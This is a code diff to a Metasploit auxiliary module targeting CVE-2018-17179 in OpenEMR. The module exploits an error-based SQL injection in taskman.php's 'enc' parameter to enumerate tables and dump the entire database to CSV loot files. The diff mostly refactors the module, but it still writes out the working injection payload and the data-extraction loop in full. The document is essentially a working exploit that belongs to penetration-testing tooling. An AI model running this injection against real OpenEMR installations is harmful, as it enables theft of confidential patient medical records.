@@ -8,6 +8,8 @@ require 'nokogiri'
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Auxiliary::Report
+  include Msf::Exploit
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -19,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
                         vulnerability allows the contents of the entire
                         database (with exception of log and task tables) to be
                         extracted.
-                        This module saves each table as a \'.csv\' file in your
+                        This module saves each table as a `.csv` file in your
                         loot directory and has been tested with
                         OpenEMR 5.0.1 (3).
                       ',
@@ -32,13 +34,10 @@ class MetasploitModule < Msf::Auxiliary
                         ['CVE', '2018-17179'],
                         ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
                       ],
-                      'Platform' => ['php'],
-                      'Arch' => ARCH_PHP,
                       'Targets' =>
                         [
                           ['OpenEMR < 5.0.1 (6)', {}]
                         ],
-                      'Privileged' => false,
                       'DisclosureDate' => 'May 17 2019',
                       'DefaultTarget' => 0))
 
@@ -82,22 +81,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_response(payload)
-    path = "#{uri}/interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
+    path = "#{uri}/interface/forms/eye_mag/taskman.php?"
     # This is only going to work for spaces.  Ideally we could use URI.encode
     # but that is deprecated and CGI.escape uses + which doesn't work
     # for this application.
     path = path.gsub ' ', '%20'
     response = send_request_cgi(
       'method' => 'GET',
-      'uri' => normalize_uri(path)
+      'uri' => normalize_uri(path),
+      'vars_get' => {
+        'action' => 'make_task',
+        'from_id' => '1',
+        'to_id' => '1',
+        'pid' => '1',
+        'doc_type' => '1',
+        'doc_id' => '1',
+        'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
+      }
     )
     response.body
   end
 
   def parse_xpath_error(response_body)
-    matches = response_body.match %r{.*XPATH syntax error: '~(.*)'</font.*$}
+    matches = response_body.match %r{XPATH syntax error: '~(.*)'</font.*$}
     return matches[1] if matches
-
+  rescue IndexError
     nil
   end
 
@@ -137,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
 
     loop do
       values_sql_string = "'" + values.join("','") + "'"
-      not_in_clause = !values.empty? ? "#{column_name} NOT IN (#{values_sql_string})" : ''
+      not_in_clause = values.empty? ? '' : "#{column_name} NOT IN (#{values_sql_string})"
       value = fetch_complete(column_name, table_name, where_condition, not_in_clause)
       break if value.nil? || value.empty?
 
@@ -167,10 +175,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def walk_table(table)
     primary_key = find_primary_key(table)
-    columns = enumerate_columns(table)
-
     return if primary_key.nil?
 
+    columns = enumerate_columns(table)
     key_values = enumerate_iteratively(primary_key,
                                        table,
                                        '')
@@ -189,24 +196,26 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def save_csv(data, filename)
-    CSV.open(filename, 'w+') do |csv|
-      data.each do |row|
-        csv << row
-      end
-    end
+    store_loot(
+      'openemr.database.dump',
+      'application/CSV',
+      rhost,
+      data,
+      filename
+    )
   end
 
   def dump_all
     payload = 'version()'
     db_version = exec_payload_and_parse(payload)
     print_status("DB Version: #{db_version}")
-    print_status('Enumerating Tables, this may take a moment...')
+    print_status('Enumerating tables, this may take a moment...')
     tables = enumerate_tables
     num_tables = tables.length
     print_status("Identified #{num_tables} tables.")
 
     count = 1
-    rand_token = rand(36**8).to_s(36)
+    rand_token = rand_text(8)
     dump_dir = File.join(Msf::Config.loot_directory, 'openemr-' + rand_token)
     Dir.mkdir dump_dir
     print_status("Created dump directory: #{dump_dir}")
@@ -214,14 +223,13 @@ class MetasploitModule < Msf::Auxiliary
     # These tables are impossible to fetch because they increase each request
     skiptables = %w[form_taskman log log_comment_encrypt]
     tables.each do |table|
-      if !skiptables.include?(table)
-
+      if skiptables.include?(table)
+        print_status("Skipping table (#{count}/#{num_tables}): #{table}")
+      else
         print_status("Dumping table (#{count}/#{num_tables}): #{table}")
         table_data = walk_table(table)
         table_data_file_path = File.join(dump_dir, table + '.csv')
         save_csv(table_data, table_data_file_path)
-      else
-        print_status("Skipping table (#{count}/#{num_tables}): #{table}")
       end
 
       count += 1
